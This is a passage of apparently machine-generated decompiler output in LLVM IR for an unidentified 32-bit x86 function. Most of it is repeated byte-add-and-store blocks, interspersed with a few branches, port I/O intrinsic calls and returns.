  %202 = add i8 %199, %201, !insn.addr !365
  %203 = inttoptr i32 %200 to i8*, !insn.addr !365
  store i8 %202, i8* %203, align 1, !insn.addr !365
  %204 = load i8, i8* %7, align 4, !insn.addr !366
  %205 = load i32, i32* %eax, align 4
  %206 = trunc i32 %205 to i8, !insn.addr !366
  %207 = add i8 %204, %206, !insn.addr !366
  %208 = inttoptr i32 %205 to i8*, !insn.addr !366
  store i8 %207, i8* %208, align 1, !insn.addr !366
  %209 = load i8, i8* %7, align 4, !insn.addr !367
  %210 = load i32, i32* %eax, align 4
  %211 = trunc i32 %210 to i8, !insn.addr !367
  %212 = add i8 %209, %211, !insn.addr !367
  %213 = inttoptr i32 %210 to i8*, !insn.addr !367
  store i8 %212, i8* %213, align 1, !insn.addr !367
  %214 = load i8, i8* %7, align 4, !insn.addr !368
  %215 = load i32, i32* %eax, align 4
  %216 = trunc i32 %215 to i8, !insn.addr !368
  %217 = add i8 %214, %216, !insn.addr !368
  %218 = inttoptr i32 %215 to i8*, !insn.addr !368
  store i8 %217, i8* %218, align 1, !insn.addr !368
  %219 = load i8, i8* %7, align 4, !insn.addr !369
  %220 = load i32, i32* %eax, align 4
  %221 = trunc i32 %220 to i8, !insn.addr !369
  %222 = add i8 %219, %221, !insn.addr !369
  %223 = inttoptr i32 %220 to i8*, !insn.addr !369
  store i8 %222, i8* %223, align 1, !insn.addr !369
  %224 = load i8, i8* %7, align 4, !insn.addr !370
  %225 = load i32, i32* %eax, align 4
  %226 = trunc i32 %225 to i8, !insn.addr !370
  %227 = add i8 %224, %226, !insn.addr !370
  %228 = inttoptr i32 %225 to i8*, !insn.addr !370
  store i8 %227, i8* %228, align 1, !insn.addr !370
  %229 = load i8, i8* %7, align 4, !insn.addr !371
  %230 = load i32, i32* %eax, align 4
  %231 = trunc i32 %230 to i8, !insn.addr !371
  %232 = add i8 %229, %231, !insn.addr !371
  %233 = inttoptr i32 %230 to i8*, !insn.addr !371
  store i8 %232, i8* %233, align 1, !insn.addr !371
  %234 = load i8, i8* %7, align 4, !insn.addr !372
  %235 = load i32, i32* %eax, align 4
  %236 = trunc i32 %235 to i8, !insn.addr !372
  %237 = add i8 %234, %236, !insn.addr !372
  %238 = inttoptr i32 %235 to i8*, !insn.addr !372
  store i8 %237, i8* %238, align 1, !insn.addr !372
  %239 = load i8, i8* %7, align 4, !insn.addr !373
  %240 = load i32, i32* %eax, align 4
  %241 = trunc i32 %240 to i8, !insn.addr !373
  %242 = add i8 %239, %241, !insn.addr !373
  %243 = inttoptr i32 %240 to i8*, !insn.addr !373
  store i8 %242, i8* %243, align 1, !insn.addr !373
  %244 = load i8, i8* %7, align 4, !insn.addr !374
  %245 = load i32, i32* %eax, align 4
  %246 = trunc i32 %245 to i8, !insn.addr !374
  %247 = add i8 %244, %246, !insn.addr !374
  %248 = inttoptr i32 %245 to i8*, !insn.addr !374
  store i8 %247, i8* %248, align 1, !insn.addr !374
  %249 = load i8, i8* %7, align 4, !insn.addr !375
  %250 = load i32, i32* %eax, align 4
  %251 = trunc i32 %250 to i8, !insn.addr !375
  %252 = add i8 %249, %251, !insn.addr !375
  %253 = inttoptr i32 %250 to i8*, !insn.addr !375
  store i8 %252, i8* %253, align 1, !insn.addr !375
  %254 = load i8, i8* %7, align 4, !insn.addr !376
  %255 = load i32, i32* %eax, align 4
  %256 = trunc i32 %255 to i8, !insn.addr !376
  %257 = add i8 %254, %256, !insn.addr !376
  %258 = inttoptr i32 %255 to i8*, !insn.addr !376
  store i8 %257, i8* %258, align 1, !insn.addr !376
  %259 = load i8, i8* %7, align 4, !insn.addr !377
  %260 = load i32, i32* %eax, align 4
  %261 = trunc i32 %260 to i8, !insn.addr !377
  %262 = add i8 %259, %261, !insn.addr !377
  %263 = inttoptr i32 %260 to i8*, !insn.addr !377
  store i8 %262, i8* %263, align 1, !insn.addr !377
  %264 = load i8, i8* %7, align 4, !insn.addr !378
  %265 = load i32, i32* %eax, align 4
  %266 = trunc i32 %265 to i8, !insn.addr !378
  %267 = add i8 %264, %266, !insn.addr !378
  %268 = inttoptr i32 %265 to i8*, !insn.addr !378
  store i8 %267, i8* %268, align 1, !insn.addr !378
  %269 = load i8, i8* %7, align 4, !insn.addr !379
  %270 = load i32, i32* %eax, align 4
  %271 = trunc i32 %270 to i8, !insn.addr !379
  %272 = add i8 %269, %271, !insn.addr !379
  %273 = inttoptr i32 %270 to i8*, !insn.addr !379
  store i8 %272, i8* %273, align 1, !insn.addr !379
  %274 = load i8, i8* %7, align 4, !insn.addr !380
  %275 = load i32, i32* %eax, align 4
  %276 = trunc i32 %275 to i8, !insn.addr !380
  %277 = add i8 %274, %276, !insn.addr !380
  %278 = inttoptr i32 %275 to i8*, !insn.addr !380
  store i8 %277, i8* %278, align 1, !insn.addr !380
  %279 = load i8, i8* %7, align 4, !insn.addr !381
  %280 = load i32, i32* %eax, align 4
  %281 = trunc i32 %280 to i8, !insn.addr !381
  %282 = add i8 %279, %281, !insn.addr !381
  %283 = inttoptr i32 %280 to i8*, !insn.addr !381
  store i8 %282, i8* %283, align 1, !insn.addr !381
  %284 = load i8, i8* %7, align 4, !insn.addr !382
  %285 = load i32, i32* %eax, align 4
  %286 = trunc i32 %285 to i8, !insn.addr !382
  %287 = add i8 %284, %286, !insn.addr !382
  %288 = inttoptr i32 %285 to i8*, !insn.addr !382
  store i8 %287, i8* %288, align 1, !insn.addr !382
  %289 = load i8, i8* %7, align 4, !insn.addr !383
  %290 = load i32, i32* %eax, align 4
  %291 = trunc i32 %290 to i8, !insn.addr !383
  %292 = add i8 %289, %291, !insn.addr !383
  %293 = inttoptr i32 %290 to i8*, !insn.addr !383
  store i8 %292, i8* %293, align 1, !insn.addr !383
  %294 = load i8, i8* %7, align 4, !insn.addr !384
  %295 = load i32, i32* %eax, align 4, !insn.addr !384
  %296 = trunc i32 %295 to i8, !insn.addr !384
  %297 = add i8 %294, %296, !insn.addr !384
  %298 = xor i8 %297, %294, !insn.addr !384
  %299 = xor i8 %297, %296, !insn.addr !384
  %300 = and i8 %298, %299, !insn.addr !384
  %301 = icmp slt i8 %300, 0, !insn.addr !384
  %302 = inttoptr i32 %295 to i8*, !insn.addr !384
  store i8 %297, i8* %302, align 1, !insn.addr !384
  br i1 %301, label %dec_label_pc_40490e, label %dec_label_pc_40489e, !insn.addr !385

dec_label_pc_40489e:                              ; preds = %dec_label_pc_40485d
  %303 = icmp slt i8 %297, 0, !insn.addr !384
  %304 = call i8 @__asm_insb(i16 %5), !insn.addr !386
  store i8 %304, i8* %167, align 1, !insn.addr !386
  %phitmp = icmp eq i1 %303, false
  %.pre = inttoptr i32 %1 to i8*, !insn.addr !358
  %305 = load i8, i8* %.pre, align 1, !insn.addr !358
  call void @__asm_outsb(i16 %5, i8 %305), !insn.addr !358
  br i1 %phitmp, label %dec_label_pc_4048e2, label %dec_label_pc_4048a1, !insn.addr !387

dec_label_pc_4048a1:                              ; preds = %dec_label_pc_40489e
  %306 = call i32 @__readfsdword(i32 %4), !insn.addr !388
  call void @__asm_outsd(i16 %5, i32 %306), !insn.addr !388
  %307 = load i8, i8* %7, align 4, !insn.addr !389
  %308 = load i32, i32* %eax, align 4
  %309 = trunc i32 %308 to i8, !insn.addr !389
  %310 = add i8 %307, %309, !insn.addr !389
  %311 = inttoptr i32 %308 to i8*, !insn.addr !389
  store i8 %310, i8* %311, align 1, !insn.addr !389
  %312 = load i8, i8* %7, align 4, !insn.addr !390
  %313 = load i32, i32* %eax, align 4
  %314 = trunc i32 %313 to i8, !insn.addr !390
  %315 = add i8 %312, %314, !insn.addr !390
  %316 = inttoptr i32 %313 to i8*, !insn.addr !390
  store i8 %315, i8* %316, align 1, !insn.addr !390
  %317 = load i8, i8* %7, align 4, !insn.addr !391
  %318 = load i32, i32* %eax, align 4
  %319 = trunc i32 %318 to i8, !insn.addr !391
  %320 = add i8 %317, %319, !insn.addr !391
  %321 = inttoptr i32 %318 to i8*, !insn.addr !391
  store i8 %320, i8* %321, align 1, !insn.addr !391
  %322 = load i8, i8* %7, align 4, !insn.addr !392
  %323 = load i32, i32* %eax, align 4
  %324 = trunc i32 %323 to i8, !insn.addr !392
  %325 = add i8 %322, %324, !insn.addr !392
  %326 = inttoptr i32 %323 to i8*, !insn.addr !392
  store i8 %325, i8* %326, align 1, !insn.addr !392
  %327 = load i8, i8* %7, align 4, !insn.addr !393
  %328 = load i32, i32* %eax, align 4
  %329 = trunc i32 %328 to i8, !insn.addr !393
  %330 = add i8 %327, %329, !insn.addr !393
  %331 = inttoptr i32 %328 to i8*, !insn.addr !393
  store i8 %330, i8* %331, align 1, !insn.addr !393
  %332 = load i8, i8* %7, align 4, !insn.addr !394
  %333 = load i32, i32* %eax, align 4
  %334 = trunc i32 %333 to i8, !insn.addr !394
  %335 = add i8 %332, %334, !insn.addr !394
  %336 = inttoptr i32 %333 to i8*, !insn.addr !394
  store i8 %335, i8* %336, align 1, !insn.addr !394
  %337 = load i8, i8* %7, align 4, !insn.addr !395
  %338 = load i32, i32* %eax, align 4
  %339 = trunc i32 %338 to i8, !insn.addr !395
  %340 = add i8 %337, %339, !insn.addr !395
  %341 = inttoptr i32 %338 to i8*, !insn.addr !395
  store i8 %340, i8* %341, align 1, !insn.addr !395
  %342 = load i8, i8* %7, align 4, !insn.addr !396
  %343 = load i32, i32* %eax, align 4
  %344 = trunc i32 %343 to i8, !insn.addr !396
  %345 = add i8 %342, %344, !insn.addr !396
  %346 = inttoptr i32 %343 to i8*, !insn.addr !396
  store i8 %345, i8* %346, align 1, !insn.addr !396
  %347 = load i8, i8* %7, align 4, !insn.addr !397
  %348 = load i32, i32* %eax, align 4
  %349 = trunc i32 %348 to i8, !insn.addr !397
  %350 = add i8 %347, %349, !insn.addr !397
  %351 = inttoptr i32 %348 to i8*, !insn.addr !397
  store i8 %350, i8* %351, align 1, !insn.addr !397
  %352 = load i8, i8* %7, align 4, !insn.addr !398
  %353 = load i32, i32* %eax, align 4
  %354 = trunc i32 %353 to i8, !insn.addr !398
  %355 = add i8 %352, %354, !insn.addr !398
  %356 = inttoptr i32 %353 to i8*, !insn.addr !398
  store i8 %355, i8* %356, align 1, !insn.addr !398
  %357 = load i8, i8* %7, align 4, !insn.addr !399
  %358 = load i32, i32* %eax, align 4
  %359 = trunc i32 %358 to i8, !insn.addr !399
  %360 = add i8 %357, %359, !insn.addr !399
  %361 = inttoptr i32 %358 to i8*, !insn.addr !399
  store i8 %360, i8* %361, align 1, !insn.addr !399
  %362 = load i8, i8* %7, align 4, !insn.addr !400
  %363 = load i32, i32* %eax, align 4
  %364 = trunc i32 %363 to i8, !insn.addr !400
  %365 = add i8 %362, %364, !insn.addr !400
  %366 = inttoptr i32 %363 to i8*, !insn.addr !400
  store i8 %365, i8* %366, align 1, !insn.addr !400
  %367 = load i8, i8* %7, align 4, !insn.addr !401
  %368 = load i32, i32* %eax, align 4
  %369 = trunc i32 %368 to i8, !insn.addr !401
  %370 = add i8 %367, %369, !insn.addr !401
  %371 = inttoptr i32 %368 to i8*, !insn.addr !401
  store i8 %370, i8* %371, align 1, !insn.addr !401
  %372 = load i8, i8* %7, align 4, !insn.addr !402
  %373 = load i32, i32* %eax, align 4
  %374 = trunc i32 %373 to i8, !insn.addr !402
  %375 = add i8 %372, %374, !insn.addr !402
  %376 = inttoptr i32 %373 to i8*, !insn.addr !402
  store i8 %375, i8* %376, align 1, !insn.addr !402
  %377 = load i8, i8* %7, align 4, !insn.addr !403
  %378 = load i32, i32* %eax, align 4
  %379 = trunc i32 %378 to i8, !insn.addr !403
  %380 = add i8 %377, %379, !insn.addr !403
  %381 = inttoptr i32 %378 to i8*, !insn.addr !403
  store i8 %380, i8* %381, align 1, !insn.addr !403
  %382 = load i8, i8* %7, align 4, !insn.addr !404
  %383 = load i32, i32* %eax, align 4
  %384 = trunc i32 %383 to i8, !insn.addr !404
  %385 = add i8 %382, %384, !insn.addr !404
  %386 = inttoptr i32 %383 to i8*, !insn.addr !404
  store i8 %385, i8* %386, align 1, !insn.addr !404
  %387 = load i8, i8* %7, align 4, !insn.addr !405
  %388 = load i32, i32* %eax, align 4
  %389 = trunc i32 %388 to i8, !insn.addr !405
  %390 = add i8 %387, %389, !insn.addr !405
  %391 = inttoptr i32 %388 to i8*, !insn.addr !405
  store i8 %390, i8* %391, align 1, !insn.addr !405
  %392 = load i8, i8* %7, align 4, !insn.addr !406
  %393 = load i32, i32* %eax, align 4
  %394 = trunc i32 %393 to i8, !insn.addr !406
  %395 = add i8 %392, %394, !insn.addr !406
  %396 = inttoptr i32 %393 to i8*, !insn.addr !406
  store i8 %395, i8* %396, align 1, !insn.addr !406
  br label %dec_label_pc_4048ce, !insn.addr !406

dec_label_pc_4048ce:                              ; preds = %dec_label_pc_4048a1, %dec_label_pc_404810
  %397 = load i8, i8* %7, align 4, !insn.addr !407
  %398 = load i32, i32* %eax, align 4
  %399 = trunc i32 %398 to i8, !insn.addr !407
  %400 = add i8 %397, %399, !insn.addr !407
  %401 = inttoptr i32 %398 to i8*, !insn.addr !407
  store i8 %400, i8* %401, align 1, !insn.addr !407
  %402 = load i8, i8* %7, align 4, !insn.addr !408
  %403 = load i32, i32* %eax, align 4
  %404 = trunc i32 %403 to i8, !insn.addr !408
  %405 = add i8 %402, %404, !insn.addr !408
  %406 = inttoptr i32 %403 to i8*, !insn.addr !408
  store i8 %405, i8* %406, align 1, !insn.addr !408
  %407 = load i8, i8* %7, align 4, !insn.addr !409
  %408 = load i32, i32* %eax, align 4
  %409 = trunc i32 %408 to i8, !insn.addr !409
  %410 = add i8 %407, %409, !insn.addr !409
  %411 = inttoptr i32 %408 to i8*, !insn.addr !409
  store i8 %410, i8* %411, align 1, !insn.addr !409
  %412 = load i8, i8* %7, align 4, !insn.addr !410
  %413 = load i32, i32* %eax, align 4
  %414 = trunc i32 %413 to i8, !insn.addr !410
  %415 = add i8 %412, %414, !insn.addr !410
  %416 = inttoptr i32 %413 to i8*, !insn.addr !410
  store i8 %415, i8* %416, align 1, !insn.addr !410
  %417 = load i8, i8* %7, align 4, !insn.addr !411
  %418 = load i32, i32* %eax, align 4
  %419 = trunc i32 %418 to i8, !insn.addr !411
  %420 = add i8 %417, %419, !insn.addr !411
  %421 = inttoptr i32 %418 to i8*, !insn.addr !411
  store i8 %420, i8* %421, align 1, !insn.addr !411
  %422 = load i8, i8* %7, align 4, !insn.addr !412
  %423 = load i32, i32* %eax, align 4
  %424 = trunc i32 %423 to i8, !insn.addr !412
  %425 = add i8 %422, %424, !insn.addr !412
  %426 = inttoptr i32 %423 to i8*, !insn.addr !412
  store i8 %425, i8* %426, align 1, !insn.addr !412
  %427 = load i8, i8* %7, align 4, !insn.addr !413
  %428 = load i32, i32* %eax, align 4
  %429 = trunc i32 %428 to i8, !insn.addr !413
  %430 = add i8 %427, %429, !insn.addr !413
  %431 = icmp slt i8 %430, 0, !insn.addr !413
  %432 = inttoptr i32 %428 to i8*, !insn.addr !413
  store i8 %430, i8* %432, align 1, !insn.addr !413
  %433 = icmp eq i1 %431, false, !insn.addr !414
  br i1 %433, label %dec_label_pc_404948, label %dec_label_pc_4048de, !insn.addr !414

dec_label_pc_4048de:                              ; preds = %dec_label_pc_4048ce
  %434 = load i32, i32* %eax, align 4, !insn.addr !414
  ret i32 %434, !insn.addr !414

dec_label_pc_4048e2:                              ; preds = %dec_label_pc_40489e.thread, %dec_label_pc_40489e
  %esi.01.reload = load i32, i32* %esi.01.reg2mem
  %435 = inttoptr i32 %esi.01.reload to i32*, !insn.addr !415
  %436 = load i32, i32* %435, align 4, !insn.addr !415
  call void @__asm_outsd(i16 %5, i32 %436), !insn.addr !415
  %437 = load i8, i8* %7, align 4, !insn.addr !416
  %438 = load i32, i32* %eax, align 4
  %439 = trunc i32 %438 to i8, !insn.addr !416
  %440 = add i8 %437, %439, !insn.addr !416
  %441 = inttoptr i32 %438 to i8*, !insn.addr !416
  store i8 %440, i8* %441, align 1, !insn.addr !416
  %442 = load i8, i8* %7, align 4, !insn.addr !417
  %443 = load i32, i32* %eax, align 4
  %444 = trunc i32 %443 to i8, !insn.addr !417
  %445 = add i8 %442, %444, !insn.addr !417
  %446 = inttoptr i32 %443 to i8*, !insn.addr !417
  store i8 %445, i8* %446, align 1, !insn.addr !417
  %447 = load i8, i8* %7, align 4, !insn.addr !418
  %448 = load i32, i32* %eax, align 4
  %449 = trunc i32 %448 to i8, !insn.addr !418
  %450 = add i8 %447, %449, !insn.addr !418
  %451 = inttoptr i32 %448 to i8*, !insn.addr !418
  store i8 %450, i8* %451, align 1, !insn.addr !418
  %452 = load i8, i8* %7, align 4, !insn.addr !419
  %453 = load i32, i32* %eax, align 4
  %454 = trunc i32 %453 to i8, !insn.addr !419
  %455 = add i8 %452, %454, !insn.addr !419
  %456 = inttoptr i32 %453 to i8*, !insn.addr !419
  store i8 %455, i8* %456, align 1, !insn.addr !419
  %457 = load i8, i8* %7, align 4, !insn.addr !420
  %458 = load i32, i32* %eax, align 4
  %459 = trunc i32 %458 to i8, !insn.addr !420
  %460 = add i8 %457, %459, !insn.addr !420
  %461 = inttoptr i32 %458 to i8*, !insn.addr !420
  store i8 %460, i8* %461, align 1, !insn.addr !420
  %462 = load i8, i8* %7, align 4, !insn.addr !421
  %463 = load i32, i32* %eax, align 4
  %464 = trunc i32 %463 to i8, !insn.addr !421
  %465 = add i8 %462, %464, !insn.addr !421
  %466 = inttoptr i32 %463 to i8*, !insn.addr !421
  store i8 %465, i8* %466, align 1, !insn.addr !421
  %467 = load i8, i8* %7, align 4, !insn.addr !422
  %468 = load i32, i32* %eax, align 4
  %469 = trunc i32 %468 to i8, !insn.addr !422
  %470 = add i8 %467, %469, !insn.addr !422
  %471 = inttoptr i32 %468 to i8*, !insn.addr !422
  store i8 %470, i8* %471, align 1, !insn.addr !422
  %472 = load i8, i8* %7, align 4, !insn.addr !423
  %473 = load i32, i32* %eax, align 4
  %474 = trunc i32 %473 to i8, !insn.addr !423
  %475 = add i8 %472, %474, !insn.addr !423
  %476 = inttoptr i32 %473 to i8*, !insn.addr !423
  store i8 %475, i8* %476, align 1, !insn.addr !423
  %477 = load i8, i8* %7, align 4, !insn.addr !424
  %478 = load i32, i32* %eax, align 4
  %479 = trunc i32 %478 to i8, !insn.addr !424
  %480 = add i8 %477, %479, !insn.addr !424
  %481 = inttoptr i32 %478 to i8*, !insn.addr !424
  store i8 %480, i8* %481, align 1, !insn.addr !424
  %482 = load i8, i8* %7, align 4, !insn.addr !425
  %483 = load i32, i32* %eax, align 4
  %484 = trunc i32 %483 to i8, !insn.addr !425
  %485 = add i8 %482, %484, !insn.addr !425
  %486 = inttoptr i32 %483 to i8*, !insn.addr !425
  store i8 %485, i8* %486, align 1, !insn.addr !425
  %487 = load i8, i8* %7, align 4, !insn.addr !426
  %488 = load i32, i32* %eax, align 4
  %489 = trunc i32 %488 to i8, !insn.addr !426
  %490 = add i8 %487, %489, !insn.addr !426
  %491 = inttoptr i32 %488 to i8*, !insn.addr !426
  store i8 %490, i8* %491, align 1, !insn.addr !426
  %492 = load i8, i8* %7, align 4, !insn.addr !427
  %493 = load i32, i32* %eax, align 4
  %494 = trunc i32 %493 to i8, !insn.addr !427
  %495 = add i8 %492, %494, !insn.addr !427
  %496 = inttoptr i32 %493 to i8*, !insn.addr !427
  store i8 %495, i8* %496, align 1, !insn.addr !427
  %497 = load i8, i8* %7, align 4, !insn.addr !428
  %498 = load i32, i32* %eax, align 4
  %499 = trunc i32 %498 to i8, !insn.addr !428
  %500 = add i8 %497, %499, !insn.addr !428
  %501 = inttoptr i32 %498 to i8*, !insn.addr !428
  store i8 %500, i8* %501, align 1, !insn.addr !428
  %502 = load i8, i8* %7, align 4, !insn.addr !429
  %503 = load i32, i32* %eax, align 4
  %504 = trunc i32 %503 to i8, !insn.addr !429
  %505 = add i8 %502, %504, !insn.addr !429
  %506 = inttoptr i32 %503 to i8*, !insn.addr !429
  store i8 %505, i8* %506, align 1, !insn.addr !429
  %507 = load i8, i8* %7, align 4, !insn.addr !430
  %508 = load i32, i32* %eax, align 4
  %509 = trunc i32 %508 to i8, !insn.addr !430
  %510 = add i8 %507, %509, !insn.addr !430
  %511 = inttoptr i32 %508 to i8*, !insn.addr !430
  store i8 %510, i8* %511, align 1, !insn.addr !430
  %512 = load i8, i8* %7, align 4, !insn.addr !431
  %513 = load i32, i32* %eax, align 4
  %514 = trunc i32 %513 to i8, !insn.addr !431
  %515 = add i8 %512, %514, !insn.addr !431
  %516 = inttoptr i32 %513 to i8*, !insn.addr !431
  store i8 %515, i8* %516, align 1, !insn.addr !431
  %517 = load i8, i8* %7, align 4, !insn.addr !432
  %518 = load i32, i32* %eax, align 4
  %519 = trunc i32 %518 to i8, !insn.addr !432
  %520 = add i8 %517, %519, !insn.addr !432
  %521 = inttoptr i32 %518 to i8*, !insn.addr !432
  store i8 %520, i8* %521, align 1, !insn.addr !432
  %522 = load i8, i8* %7, align 4, !insn.addr !433
  %523 = load i32, i32* %eax, align 4
  %524 = trunc i32 %523 to i8, !insn.addr !433
  %525 = add i8 %522, %524, !insn.addr !433
  %526 = inttoptr i32 %523 to i8*, !insn.addr !433
  store i8 %525, i8* %526, align 1, !insn.addr !433
  %527 = load i8, i8* %7, align 4, !insn.addr !434
  %528 = load i32, i32* %eax, align 4
  %529 = trunc i32 %528 to i8, !insn.addr !434
  %530 = add i8 %527, %529, !insn.addr !434
  %531 = inttoptr i32 %528 to i8*, !insn.addr !434
  store i8 %530, i8* %531, align 1, !insn.addr !434
  %532 = load i8, i8* %7, align 4, !insn.addr !435
  %533 = load i32, i32* %eax, align 4
  %534 = trunc i32 %533 to i8, !insn.addr !435
  %535 = add i8 %532, %534, !insn.addr !435
  %536 = inttoptr i32 %533 to i8*, !insn.addr !435
  store i8 %535, i8* %536, align 1, !insn.addr !435
  %537 = load i32, i32* %eax, align 4, !insn.addr !435
  ret i32 %537, !insn.addr !435

dec_label_pc_40490e:                              ; preds = %dec_label_pc_40485d
  %538 = load i8, i8* %7, align 4, !insn.addr !436
  %539 = load i32, i32* %eax, align 4
  %540 = trunc i32 %539 to i8, !insn.addr !436
  %541 = add i8 %538, %540, !insn.addr !436
  %542 = inttoptr i32 %539 to i8*, !insn.addr !436
  store i8 %541, i8* %542, align 1, !insn.addr !436
  %543 = load i8, i8* %7, align 4, !insn.addr !437
  %544 = load i32, i32* %eax, align 4
  %545 = trunc i32 %544 to i8, !insn.addr !437
  %546 = add i8 %543, %545, !insn.addr !437
  %547 = inttoptr i32 %544 to i8*, !insn.addr !437
  store i8 %546, i8* %547, align 1, !insn.addr !437
  %548 = load i8, i8* %7, align 4, !insn.addr !438
  %549 = load i32, i32* %eax, align 4
  %550 = trunc i32 %549 to i8, !insn.addr !438
  %551 = add i8 %548, %550, !insn.addr !438
  %552 = inttoptr i32 %549 to i8*, !insn.addr !438
  store i8 %551, i8* %552, align 1, !insn.addr !438
  %553 = load i8, i8* %7, align 4, !insn.addr !439
  %554 = load i32, i32* %eax, align 4
  %555 = trunc i32 %554 to i8, !insn.addr !439
  %556 = add i8 %553, %555, !insn.addr !439
  %557 = inttoptr i32 %554 to i8*, !insn.addr !439
  store i8 %556, i8* %557, align 1, !insn.addr !439
  %558 = load i8, i8* %7, align 4, !insn.addr !440
  %559 = load i32, i32* %eax, align 4
  %560 = trunc i32 %559 to i8, !insn.addr !440
  %561 = add i8 %558, %560, !insn.addr !440
  %562 = inttoptr i32 %559 to i8*, !insn.addr !440
  store i8 %561, i8* %562, align 1, !insn.addr !440
  %563 = load i8, i8* %7, align 4, !insn.addr !441
  %564 = load i32, i32* %eax, align 4
  %565 = trunc i32 %564 to i8, !insn.addr !441
  %566 = add i8 %563, %565, !insn.addr !441
  %567 = inttoptr i32 %564 to i8*, !insn.addr !441
  store i8 %566, i8* %567, align 1, !insn.addr !441
  %568 = load i8, i8* %7, align 4, !insn.addr !442
  %569 = load i32, i32* %eax, align 4
  %570 = trunc i32 %569 to i8, !insn.addr !442
  %571 = add i8 %568, %570, !insn.addr !442
  %572 = inttoptr i32 %569 to i8*, !insn.addr !442
  store i8 %571, i8* %572, align 1, !insn.addr !442
  %573 = load i8, i8* %7, align 4, !insn.addr !443
  %574 = load i32, i32* %eax, align 4
  %575 = trunc i32 %574 to i8, !insn.addr !443
  %576 = add i8 %573, %575, !insn.addr !443
  %577 = inttoptr i32 %574 to i8*, !insn.addr !443
  store i8 %576, i8* %577, align 1, !insn.addr !443
  %578 = load i8, i8* %7, align 4, !insn.addr !444
  %579 = load i32, i32* %eax, align 4
  %580 = trunc i32 %579 to i8, !insn.addr !444
  %581 = add i8 %578, %580, !insn.addr !444
  %582 = icmp eq i8 %581, 0, !insn.addr !444
  %583 = inttoptr i32 %579 to i8*, !insn.addr !444
  store i8 %581, i8* %583, align 1, !insn.addr !444
  br i1 %582, label %dec_label_pc_404990, label %dec_label_pc_404995, !insn.addr !445

dec_label_pc_404948:                              ; preds = %dec_label_pc_4048ce
  %584 = load i8, i8* %7, align 4, !insn.addr !446
  %585 = load i32, i32* %eax, align 4
  %586 = trunc i32 %585 to i8, !insn.addr !446
  %587 = add i8 %584, %586, !insn.addr !446
  %588 = inttoptr i32 %585 to i8*, !insn.addr !446
  store i8 %587, i8* %588, align 1, !insn.addr !446
  %589 = load i8, i8* %7, align 4, !insn.addr !447
  %590 = load i32, i32* %eax, align 4
  %591 = trunc i32 %590 to i8, !insn.addr !447
  %592 = add i8 %589, %591, !insn.addr !447
  %593 = inttoptr i32 %590 to i8*, !insn.addr !447
  store i8 %592, i8* %593, align 1, !insn.addr !447
  %594 = load i8, i8* %7, align 4, !insn.addr !448
  %595 = load i32, i32* %eax, align 4
  %596 = trunc i32 %595 to i8, !insn.addr !448
  %597 = add i8 %594, %596, !insn.addr !448
  %598 = inttoptr i32 %595 to i8*, !insn.addr !448
  store i8 %597, i8* %598, align 1, !insn.addr !448
  %599 = load i8, i8* %7, align 4, !insn.addr !449
  %600 = load i32, i32* %eax, align 4
  %601 = trunc i32 %600 to i8, !insn.addr !449
  %602 = add i8 %599, %601, !insn.addr !449
  %603 = inttoptr i32 %600 to i8*, !insn.addr !449
  store i8 %602, i8* %603, align 1, !insn.addr !449
  %604 = load i8, i8* %7, align 4, !insn.addr !450
  %605 = load i32, i32* %eax, align 4
  %606 = trunc i32 %605 to i8, !insn.addr !450
  %607 = add i8 %604, %606, !insn.addr !450
  %608 = inttoptr i32 %605 to i8*, !insn.addr !450
  store i8 %607, i8* %608, align 1, !insn.addr !450
  %609 = load i8, i8* %7, align 4, !insn.addr !451
  %610 = load i32, i32* %eax, align 4
  %611 = trunc i32 %610 to i8, !insn.addr !451
  %612 = add i8 %609, %611, !insn.addr !451
  %613 = inttoptr i32 %610 to i8*, !insn.addr !451
  store i8 %612, i8* %613, align 1, !insn.addr !451
  %614 = load i8, i8* %7, align 4, !insn.addr !452
  %615 = load i32, i32* %eax, align 4
  %616 = trunc i32 %615 to i8, !insn.addr !452
  %617 = add i8 %614, %616, !insn.addr !452
  %618 = inttoptr i32 %615 to i8*, !insn.addr !452
  store i8 %617, i8* %618, align 1, !insn.addr !452
  %619 = load i8, i8* %7, align 4, !insn.addr !453
  %620 = load i32, i32* %eax, align 4
  %621 = trunc i32 %620 to i8, !insn.addr !453
  %622 = add i8 %619, %621, !insn.addr !453
  %623 = inttoptr i32 %620 to i8*, !insn.addr !453
  store i8 %622, i8* %623, align 1, !insn.addr !453
  %624 = load i8, i8* %7, align 4, !insn.addr !454
  %625 = load i32, i32* %eax, align 4
  %626 = trunc i32 %625 to i8, !insn.addr !454
  %627 = add i8 %624, %626, !insn.addr !454
  %628 = inttoptr i32 %625 to i8*, !insn.addr !454
  store i8 %627, i8* %628, align 1, !insn.addr !454
  %629 = load i8, i8* %7, align 4, !insn.addr !455
  %630 = load i32, i32* %eax, align 4
  %631 = trunc i32 %630 to i8, !insn.addr !455
  %632 = add i8 %629, %631, !insn.addr !455
  %633 = inttoptr i32 %630 to i8*, !insn.addr !455
  store i8 %632, i8* %633, align 1, !insn.addr !455
  %634 = load i8, i8* %7, align 4, !insn.addr !456
  %635 = load i32, i32* %eax, align 4
  %636 = trunc i32 %635 to i8, !insn.addr !456
  %637 = add i8 %634, %636, !insn.addr !456
  %638 = inttoptr i32 %635 to i8*, !insn.addr !456
  store i8 %637, i8* %638, align 1, !insn.addr !456
  %639 = load i8, i8* %7, align 4, !insn.addr !457
  %640 = load i32, i32* %eax, align 4
  %641 = trunc i32 %640 to i8, !insn.addr !457
  %642 = add i8 %639, %641, !insn.addr !457
  %643 = inttoptr i32 %640 to i8*, !insn.addr !457
  store i8 %642, i8* %643, align 1, !insn.addr !457
  %644 = load i8, i8* %7, align 4, !insn.addr !458
  %645 = load i32, i32* %eax, align 4
  %646 = trunc i32 %645 to i8, !insn.addr !458
  %647 = add i8 %644, %646, !insn.addr !458
  %648 = inttoptr i32 %645 to i8*, !insn.addr !458
  store i8 %647, i8* %648, align 1, !insn.addr !458
  %649 = load i8, i8* %7, align 4, !insn.addr !459
  %650 = load i32, i32* %eax, align 4
  %651 = trunc i32 %650 to i8, !insn.addr !459
  %652 = add i8 %649, %651, !insn.addr !459
  %653 = icmp slt i8 %652, 0, !insn.addr !459
  %654 = inttoptr i32 %650 to i8*, !insn.addr !459
  store i8 %652, i8* %654, align 1, !insn.addr !459
  br i1 %653, label %dec_label_pc_4049e5, label %dec_label_pc_40496f, !insn.addr !460

dec_label_pc_40496f:                              ; preds = %dec_label_pc_404948
  %655 = load i8, i8* %7, align 4, !insn.addr !461
  %656 = load i32, i32* %eax, align 4
  %657 = trunc i32 %656 to i8, !insn.addr !461
